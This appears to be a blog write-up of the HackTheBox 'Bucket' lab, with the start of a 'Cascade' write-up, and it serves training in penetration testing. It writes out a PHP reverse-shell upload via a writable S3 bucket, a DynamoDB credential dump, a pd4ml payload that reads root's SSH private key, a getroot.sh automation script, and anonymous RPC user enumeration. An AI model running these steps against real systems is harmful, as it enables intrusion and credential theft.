authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging \u0026lt; access-control-expose-headers: x-amz-version-id \u0026lt; * Connection #0 to host s3.bucket.htb left intact I added it to /etc/hosts but it still doesn\u0026rsquo;t resolve.\n10.10.10.212 bucket.htb s3.bucket.htb 444af250749d Searching some of the header names on Google reveals those are used by Amazon S3\n Adding another / at the end of uri resolve to a DynamoDB JavaScript Shell. I have no familiarity on this.\n /health /health is probably an endpoint to monitor the service status.\n Foothold Shell as www-data AWS S3 S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I\u0026rsquo;ll use aws cli. You can find the user guide here.\nUsage in general:\naws [options] s3 \u0026lt;subcommand\u0026gt; [parameters] I\u0026rsquo;ll start by listing the S3 bucket, but then it returns an error message.\n A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.\n → root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb You must specify a region. You can also configure your region by running \u0026#34;aws configure\u0026#34;. I can resolve the problem above by typing aws configure and fill only the default region.\n→ root@iamf «bucket» «10.10.14.39» $ aws configure AWS Access Key ID [None]: AWS Secret Access Key [None]: Default region name [None]: us-east-1 Default output format [None]: Now it works and returns a bucket called adserver.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb 2020-10-21 09:16:03 adserver I can also read the objects inside adserver bucket.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb PRE images/ 2020-10-21 09:22:04 5344 index.html → root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/images/ --endpoint-url=http://s3.bucket.htb 2020-10-21 09:52:04 37840 bug.jpg 2020-10-21 09:52:04 51485 cloud.png 2020-10-21 09:52:04 16486 malware.png Those files are the same file used in bucket.htb\nPHP Reverse Shell upload via S3 The aws subcommand cp allows to copy a file (objects) from local to a bucket, and vice versa (source).\naws s3 cp \u0026lt;source\u0026gt; \u0026lt;target\u0026gt; [--options] Because I know the web server is Apache, I\u0026rsquo;ll create a php test files and upload it to the bucket.\n→ root@iamf «bucket» «10.10.14.39» $ echo \u0026#39;\u0026lt;?php echo \u0026#34;IamF\u0026#34; ?\u0026gt;\u0026#39; \u0026gt; iamf-test.php → root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb upload: ./iamf-test.php to s3://adserver/iamf-test.php I can confirm the file was successfully uploaded with the subcommand ls.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/ --endpoint-url=http://s3.bucket.htb PRE images/ 2021-04-22 14:05:15 21 iamf-test.php 2021-04-22 14:05:04 5344 index.html The file is available at http://s3.bucket.htb/adserver/iamf-test.php and http://bucket.htb/iamf-test.php but the execution of php code happens on bucket.htb. A few minutes later my files got deleted, so I can guess there\u0026rsquo;s a cleanup happening.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://s3.bucket.htb/adserver/iamf-test.php \u0026lt;?php echo \u0026#34;IamF\u0026#34; ?\u0026gt; → root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf-test.php IamF  Now I can try to drop a PHP reverse shell.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb Then I\u0026rsquo;ll trigger it using curl.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf.php I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn\u0026rsquo;t).\n→ root@iamf «bucket» «10.10.14.39» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.212] 58352 Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 18:14:02 up 13:18, 0 users, load average: 0.03, 0.04, 0.04 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1050): Inappropriate ioctl for device bash: no job control in this shell www-data@bucket:/$  Privilege Escalation Shell as roy Enumeration There is a bucket-app, but I don\u0026rsquo;t have access to it.\nwww-data@bucket:/var/www$ ls -la total 16 drwxr-xr-x 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 14 root root 4096 Feb 10 12:29 .. drwxr-x---+ 4 root root 4096 Feb 10 12:29 bucket-app drwxr-xr-x 2 root root 4096 Apr 22 18:27 html roy is the only user in this box.\nwww-data@bucket:/$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash roy:x:1000:1000:,,,:/home/roy:/bin/bash Visiting roy home directory discovers a folder called project\nwww-data@bucket:/var/www$ ls -la /home/roy total 44 drwxr-xr-x 7 roy roy 4096 Apr 22 12:03 . drwxr-xr-x 3 root root 4096 Sep 16 2020 .. drwxrwxr-x 2 roy roy 4096 Apr 22 12:03 .aws lrwxrwxrwx 1 roy roy 9 Sep 16 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 roy roy 220 Sep 16 2020 .bash_logout -rw-r--r-- 1 roy roy 3771 Sep 16 2020 .bashrc drwx------ 2 roy roy 4096 Apr 22 07:57 .cache drwx------ 4 roy roy 4096 Apr 22 08:01 .gnupg -rw-r--r-- 1 roy roy 807 Sep 16 2020 .profile drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 project drwxr-xr-x 3 roy roy 4096 Apr 22 07:59 snap -r-------- 1 roy roy 33 Apr 22 04:56 user.txt The files inside project are readable by others.\nwww-data@bucket:/home/roy/project$ ls -la total 44 drwxr-xr-x 3 roy roy 4096 Sep 24 2020 . drwxr-xr-x 5 roy roy 4096 Apr 24 17:31 .. -rw-rw-r-- 1 roy roy 63 Sep 24 2020 composer.json -rw-rw-r-- 1 roy roy 20533 Sep 24 2020 composer.lock -rw-r--r-- 1 roy roy 367 Sep 24 2020 db.php drwxrwxr-x 10 roy roy 4096 Sep 24 2020 vendor Looking into db.php, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint url.\nwww-data@bucket:/home/roy/project$ cat db.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); use Aws\\DynamoDb\\DynamoDbClient; use Aws\\DynamoDb\\Exception\\DynamoDbException; $client = new Aws\\Sdk([ \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $dynamodb = $client-\u0026gt;createDynamoDb(); //todo localhost:4566 is the internal endpoint of s3.bucket.htb\nwww-data@bucket:/home/roy/project$ curl -s http://localhost:4566 { \u0026#34;s3\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;dynamodb\u0026#34;: \u0026#34;running\u0026#34; } AWS DynamoDB DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.\nGeneral usage:\nusage: aws [options] dynamodb \u0026lt;subcommand\u0026gt; [\u0026lt;subcommand\u0026gt; ...] [parameters] Anonymous user is allowed to list the database tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \u0026#34;TableNames\u0026#34;: [ \u0026#34;users\u0026#34; ] } I can read the content of table users with the subcommand scan, and it discovers several credentials.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb { \u0026#34;Items\u0026#34;: [ { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Management@#1@#\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Mgmt\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Welcome123!\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Cloudadm\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;n2vM-\u0026lt;_K_Q:.Aa2\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Sysadm\u0026#34; } } ], \u0026#34;Count\u0026#34;: 3, \u0026#34;ScannedCount\u0026#34;: 3, \u0026#34;ConsumedCapacity\u0026#34;: null } I\u0026rsquo;ll keep those credentials.\nSSH Access Password n2vM-\u0026lt;_K_Q:.Aa2 works on roy.\n→ root@iamf «bucket» «10.10.14.39» $ crackmapexec ssh \u0026#39;10.10.10.212\u0026#39; -u roy -p passwords.list SSH 10.10.10.212 22 10.10.10.212 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4 SSH 10.10.10.212 22 10.10.10.212 [-] roy:Management@#1@# Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [-] roy:Welcome123! Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [+] roy:n2vM-\u0026lt;_K_Q:.Aa2 Now I can login into the system using roy credentials.\n→ root@iamf «bucket» «10.10.14.39» $ ssh roy@10.10.10.212 roy@10.10.10.212\u0026#39;s password: Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.02 Usage of /: 33.8% of 17.59GB Memory usage: 29% Swap usage: 0% Processes: 252 Users logged in: 0 IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...\u0026lt;SNIP\u0026gt;... roy@bucket:~$ id uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm) roy@bucket:~$ The user flag is done here.\n Shell as root Enumeration Running WinPEAS discovers another service currently running on port 8000.\n[+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46275 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - It also discovers that bucket-app in /var/www/ is belong to the root user and readable to user roy but not to others.\n[+] Readable files belonging to root and readable by me but not world readable -rwxr-x---+ 1 root root 808729 Jun 10 2020 /var/www/bucket-app/pd4ml_demo.jar -rw-r-x---+ 1 root root 358 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/README.md -rw-r-x---+ 1 root root 1085 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE -rw-r-x---+ 1 root root 4689 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php -rw-r-x---+ 1 root root 4746 Aug 6 2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php I can list the contents inside bucket-app\nroy@bucket:/var/www/bucket-app$ ls -la total 856 drwxr-x---+ 4 root root 4096 Feb 10 12:29 . drwxr-xr-x 4 root root 4096 Feb 10 12:29 .. -rw-r-x---+ 1 root root 63 Sep 23 2020 composer.json -rw-r-x---+ 1 root root 20533 Sep 23 2020 composer.lock drwxr-x---+ 2 root root 4096 Apr 22 12:38 files -rwxr-x---+ 1 root root 17222 Sep 23 2020 index.php -rwxr-x---+ 1 root root 808729 Jun 10 2020 pd4ml_demo.jar drwxr-x---+ 10 root root 4096 Feb 10 12:29 vendor According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.\nroy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf \u0026lt;VirtualHost 127.0.0.1:8000\u0026gt; # unknown \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserId root root \u0026lt;/IfModule\u0026gt; DocumentRoot /var/www/bucket-app \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; # bucket.htb DocumentRoot /var/www/html RewriteEngine On RewriteCond %{HTTP_HOST} !^bucket.htb$ RewriteRule /.* http://bucket.htb/ [R] \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; # s3.bucket.htb ProxyPreserveHost on ProxyPass / http://localhost:4566/ ProxyPassReverse / http://localhost:4566/ \u0026lt;Proxy *\u0026gt; Order deny,allow Allow from all \u0026lt;/Proxy\u0026gt; ServerAdmin webmaster@localhost ServerName s3.bucket.htb ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; Internal Web I\u0026rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.\nroy@bucket:/var/www/bucket-app$ ~C ssh\u0026gt; -L 8000:127.0.0.1:8000 Forwarding port. roy@bucket:/var/www/bucket-app$ The website page says the site is under construction.\n Source Code Review Upon reviewing the index.php, I found out that this website can be abused.\nroy@bucket:/var/www/bucket-app$ cat index.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { # POST action=get_alerts  date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([ # Connect to DynamoDB. \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array( # Read content from table alerts \u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, # Filter by title \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array(\u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;)), )); foreach ($iterator as $item) { #  $name=rand(1,10000).\u0026#39;.html\u0026#39;; # Generate randomnumber.html  file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); # Write contents to randomnumber.html } passthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\u0026#34;); # convert randomnumber.html to result.pdf } } else { ?\u0026gt; ...\u0026lt;SNIP\u0026gt;... Let\u0026rsquo;s break it down.\nWhen there is a POST request contains data of action=get_alerts, the site will create a connection to DynamoDB.\nif($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { # POST action=get_alerts  date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([ # Connect to DynamoDB.  \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); It then reads every item in table alerts and filters out the result only to the one that contains string value of “Ransomware” (the key).\n DynamoDB is key-value NoSQL database.\n $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array( # Read content from table alerts  \u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, # Filter by title  \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array(\u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;)), )); For each result, it writes the result value ($item[“data”]) of \u0026ldquo;Ransomware\u0026rdquo; to a randomly named HTML file.\nforeach ($iterator as $item) { #  $name=rand(1,10000).\u0026#39;.html\u0026#39;; # Generate randomnumber.html  file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); # Write contents to randomnumber.html } The HTML file then gets converted into a PDF file (result.pdf) using pd4ml.\npassthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name800 A4 -out files/result.pdf\u0026#34;); # convert randomnumber.html to result.pdf From the enumeration above on the DynamoDB, I know there is no table called alerts.\nThe idea is, if I have a control over the alerts table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)\n *The web application is currently running as root\n Obtain root SSH Key First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.\ntest-table.json:\n{ \u0026#34;TableName\u0026#34;: \u0026#34;iamf\u0026#34;, \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34; } ], \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;HASH\u0026#34; } ], \u0026#34;ProvisionedThroughput\u0026#34; : { \u0026#34;WriteCapacityUnits\u0026#34;: 5, \u0026#34;ReadCapacityUnits\u0026#34;: 10 } } Now I can use the subcommand create-table with --cli-input-json option and specify the JSON file.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url http://s3.bucket.htb { \u0026#34;TableDescription\u0026#34;: { \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; } ], \u0026#34;TableName\u0026#34;: \u0026#34;iamf\u0026#34;, \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;HASH\u0026#34; } ], \u0026#34;TableStatus\u0026#34;: \u0026#34;ACTIVE\u0026#34;, \u0026#34;CreationDateTime\u0026#34;: \u0026#34;2021-04-22T15:22:33.634000-04:00\u0026#34;, ...\u0026lt;SNIP\u0026gt;... I can confirm the table has been created using the subcommand list-tables.\n→ root@iamf «bucket» «10.10.14.39» $ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb { \u0026#34;TableNames\u0026#34;: [ \u0026#34;iamf\u0026#34;, \u0026#34;users\u0026#34; ] }  I can also insert items to the table, but I\u0026rsquo;ll skip it here. Detailed notes are available on my GitHub.\n Knowing this, now I can create the alerts table. I’ll write it on JSON format as well.\nalert-table.json:\n{ \u0026#34;TableName\u0026#34;: \u0026#34;alerts\u0026#34;, \u0026#34;AttributeDefinitions\u0026#34;: [ {\u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34;}, {\u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;AttributeType\u0026#34; : \u0026#34;S\u0026#34;} ], \u0026#34;KeySchema\u0026#34;: [ {\u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;HASH\u0026#34;}, {\u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;KeyType\u0026#34; : \u0026#34;RANGE\u0026#34;} ], \u0026#34;ProvisionedThroughput\u0026#34; : {\u0026#34;WriteCapacityUnits\u0026#34;: 5, \u0026#34;ReadCapacityUnits\u0026#34;: 10} } Now to abuse the application for file read, I’ll put the root SSH key path within \u0026lt;pd4ml:attachment\u0026gt; tags. The tags can be used to embed a file [source]. I\u0026rsquo;ll write it on JSON format and name it as payload.json\npayload.json\n{ \u0026#34;title\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Ransomware\u0026#34; }, \u0026#34;data\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;\u0026lt;pd4ml:attachment\u0026gt;file:///root/.ssh/id_rsa\u0026lt;/pd4ml:attachment\u0026gt;\u0026#34; } } And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as getroot.sh.\ngetroot.sh\n#!/bin/bash  echo \u0026#34;[+] Create table\u0026#34; aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url=http://s3.bucket.htb \u0026gt;/dev/null sleep 0.5 echo \u0026#34;[+] Insert item\u0026#34; aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url=http://s3.bucket.htb \u0026gt;/dev/null sleep 0.5 echo \u0026#34;[+] Send get alerts\u0026#34; curl -svd \u0026#34;action=get_alerts\u0026#34; http://127.0.0.1:8000/ # The port 8000 on Bucket forwarded to localhost:8000  The script assume all the required files are stored in the same folder.\n I’ll watch the result.pdf at /var/www/bucket/files and grab the SSH key using roy’s session.\nroy@bucket:/var/www/bucket-app/files$ while sleep 2; do sed -n \u0026#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p\u0026#39; * 2\u0026gt;/dev/null; done Now I can just execute the getroot.sh script and wait for it to complete.\n→ root@iamf «bucket» «10.10.14.39» $ ./getroot.sh [+] Create table [+] Insert item [+] Send get alerts * Trying 127.0.0.1:8000... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0) \u0026gt; POST / HTTP/1.1 \u0026gt; Host: 127.0.0.1:8000 \u0026gt; User-Agent: curl/7.66.0 \u0026gt; Accept: */* \u0026gt; Content-Length: 17 \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; * upload completely sent off: 17 out of 17 bytes * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Date: Thu, 22 Apr 2021 20:04:14 GMT \u0026lt; Server: Apache/2.4.41 (Ubuntu) \u0026lt; Content-Length: 0 \u0026lt; Content-Type: text/html; charset=UTF-8 \u0026lt; * Connection #0 to host 127.0.0.1 left intact On roy shell, I can see it captured the ssh key.\nroy@bucket:/var/www/bucket-app/files$ while sleep 1; do sed -n \u0026#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p\u0026#39; * 2\u0026gt;/dev/null; done -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn ...\u0026lt;SNIP\u0026gt;... -----END OPENSSH PRIVATE KEY----- The full process as shown below:\n I’ll save that key as root_rsa and change its permission to 600.\n→ root@iamf «bucket» «10.10.14.39» $ chmod 600 root_rsa After that, I can just login as root user using the SSH key I obtained.\n→ root@iamf «bucket» «10.10.14.39» $ ssh -i root_rsa 10.10.10.212 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) ...\u0026lt;SNIP\u0026gt;... IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:df48 ...\u0026lt;SNIP\u0026gt;... root@bucket:~# id;hostname;cut -c-15 root.txt uid=0(root) gid=0(root) groups=0(root) bucket efc73dd09ceb705  References  https://book.hacktricks.xyz/pentesting/pentesting-web/buckets/aws-s3 https://pd4ml.com/html.htm  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-bucket/","summary":"Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user.","tags":["OSCP-like","Linux","AWS","LocalStack","S3","DynamoDB","Webshell","Code-review","Tunneling","PD4ML","Gobuster"],"title":"HackTheBox - Bucket"},{"content":"Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by VbScrub, the creator of Nest. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.\nSkills Learned  RPC enumeration Decrypting VNC password Reversing .NET  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux smbclient - Preinstalled in Kali Linux rpcclient - Preinstalled in Kali Linux smbget - Preinstalled in Kali Linux evil-winrm - https://github.com/Hackplayers/evil-winrm dnSpy - https://github.com/dnSpy/dnSpy/ Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap nmap shows the typical port used by Active Directory domain controller.\n→ root@iamf «nmap» «192.168.43.234» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182 PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-03 00:20:10Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 1s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-06-03T00:21:02 |_ start_date: 2020-06-02T04:24:21 nmap discovers the domain name of Cascade and also identifies the OS version.\nI\u0026rsquo;ll take notes on these:\n Domain: cascade.local Host: Windows Server 2008 R2 SP1  The full scan almost returns the same result, except it discovers a WinRM port (5985).\n→ root@iamf «nmap» «192.168.43.234» $ nmap -p- -oA nmap/full-cascade cascade.htb PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown  I\u0026rsquo;ve added 10.10.10.182 cascade.htb to my /etc/hosts\n Enumeration TCP 445 - SMB / RPC over SMB Anonymous login is allowed on SMB port. I tried to list all the shares using smbclient but there was nothing there.\n→ root@iamf «nmap» «192.168.43.234» $ smbclient -N -L //10.10.10.182 Anonymous login successful Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available Enumeration via RPC Knowing anonymous login is allowed on SMB, I can try it too on RPC using rpcclient and it works as well.\nWith current access, I can obtain the domain users and their groups manually.\nUser enumeration\n→ root@iamf «nmap» «192.168.43.234» $ rpcclient -U \u0026#39;%\u0026#39; 10.10.10.182 rpcclient $\u0026gt; rpcclient $\u0026gt; enumdomusers user:[CascGuest] rid:[0x1f5] user:[arksvc] rid:[0x452] user:[s.smith] rid:[0x453] user:[r.thompson] rid:[0x455] user:[util] rid:[0x457] user:[j.wakefield] rid:[0x45c] user:[s.hickson] rid:[0x461] user:[j.goodhand] rid:[0x462] user:[a.turnbull] rid:[0x464] user:[e.crowe] rid:[0x467] user:[b.hanson] rid:[0x468] user:[d.burman] rid:[0x469] user:[BackupSvc] rid:[0x46a] user:[j.allen] rid:[0x46e] user:[i.croft] rid:[0x46f] I\u0026rsquo;ll save the output to a file called users, and filter the usernames only then pipe it to users.list\n→ root@iamf «cascade» «192.168.43.234» $ cat users | tr -d \u0026#39;[]\u0026#39; | cut -d \u0026#39; \u0026#39; -f1 | cut -c6- | tee users.list CascGuest arksvc s.smith r.thompson util j.wakefield s.hickson j.goodhand a.turnbull e.crowe b.hanson d.burman BackupSvc j.allen i.croft Builtin group enumeration\nrpcclient $\u0026gt; enumalsgroups builtin group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License 